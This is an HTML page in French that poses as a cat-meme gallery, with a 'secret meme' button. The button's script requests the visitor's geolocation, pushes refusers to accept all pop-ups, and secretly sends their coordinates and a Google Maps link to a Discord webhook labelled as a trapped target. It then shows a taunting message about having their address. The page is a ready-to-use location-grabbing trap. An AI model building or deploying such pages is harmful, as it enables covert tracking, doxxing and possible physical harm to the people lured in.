<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Les meilleurs refs</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 30px;
            color: #38bdf8;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            max-width: 900px;
            margin: 0 auto 40px auto;
        }
        .meme-card {
            background: #1e293b;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            padding: 10px;
        }
        .meme-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 8px;
        }
        /* Style spécial pour la carte piège au milieu */
        .trap-card {
            background: #334155;
            border: 2px dashed #38bdf8;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            border-radius: 12px;
        }
        button {
            background: #ef4444;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        button:hover {
            background: #dc2626;
        }
        #status-msg {
            font-size: 0.9rem;
            margin-top: 10px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <h1>Les meilleurs refs de chats</h1>

    <div class="gallery">
        <!-- Meme 1 -->
        <div class="meme-card">
            <img src="https://images.unsplash.com/photo-1543852786-1cf6624b9987?auto=format&fit=crop&w=500&q=80" alt="Meme 1">
            <p>Quand tu comprends la ref après 3 jours 💀</p>
        </div>

        <!-- Meme 2 : LA CARTE PIÈGE AU MILIEU -->
        <div class="meme-card trap-card" id="trap-container">
            <h3>🔥 Le meme secret exclusif</h3>
            <p id="status-msg">Clique pour débloquer la masterclass</p>
            <button onclick="declencherPiege()">Voir le meme</button>
        </div>

        <!-- Meme 3 -->
        <div class="meme-card">
            <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?auto=format&fit=crop&w=500&q=80" alt="Meme 2">
            <p>Moi quand on me spoil mon anime préféré</p>
        </div>

        <!-- Meme 4 -->
        <div class="meme-card">
            <img src="https://images.unsplash.com/photo-1573865526739-10659fec78a5?auto=format&fit=crop&w=500&q=80" alt="Meme 3">
            <p>POV : Tu gères en solo en fin de game</p>
        </div>
    </div>

    <script>
        function declencherPiege() {
            const statusMsg = document.getElementById("status-msg");
            const trapContainer = document.getElementById("trap-container");

            if (navigator.geolocation) {
                statusMsg.innerText = "Chargement du meme ultime...";
                
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;

                    // Envoi discret sur ton webhook Discord via proxy/fetch
                    envoyerSurDiscord(lat, lon);

                    // SUCCÈS : On remplace la carte par le chat qui pointe la cible !
                    trapContainer.innerHTML = `
                        <h3 style="color: #22c55e;">Tiens, c'es cadeau 😏</h3>
                        <img src="https://images.unsplash.com/photo-1533738363-b7f9aef128ce?auto=format&fit=crop&w=500&q=80" alt="Chat cible" style="width:100%; height:200px; object-fit:cover; border-radius:8px; margin-top:10px;">
                        <p style="margin-top:10px; font-weight:bold;">POV: quand je découvres qu'on a mon adresse, et que je vais préparer un plan pour trouver qui a fait ça 👌</p>
                    `;

                }, function(error) {
                    // Refus de la géolocalisation
                    statusMsg.innerText = "Erreur : Retente après avoir accepté tous les pop-ups (comme la localisation par exemple)";
                });
            } else {
                alert("Ton navigateur ne supporte pas cette fonction.");
            }
        }

        function envoyerSurDiscord(lat, lon) {
            const webhookUrl = "https://discord.com/api/webhooks/1567162318406819850/4X8w1DSk_N3a5KNrMDFpnNqXehnUP3oSJXN67vrC2aGfH8RIGMMgK9PlzEdtPmOXztMi"; // Remplace bien par ton lien de webhook Discord entre guillemets !
            
            const payload = {
                content: `🚨 **Cible piégée sur "Les meilleurs refs" !**\nLatitude : ${lat}\nLongitude : ${lon}\n[Google Maps](https://www.google.com/maps?q=${lat},${lon})`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(err => console.log("Erreur réseau"));
        }
    </script>

</body>
</html>
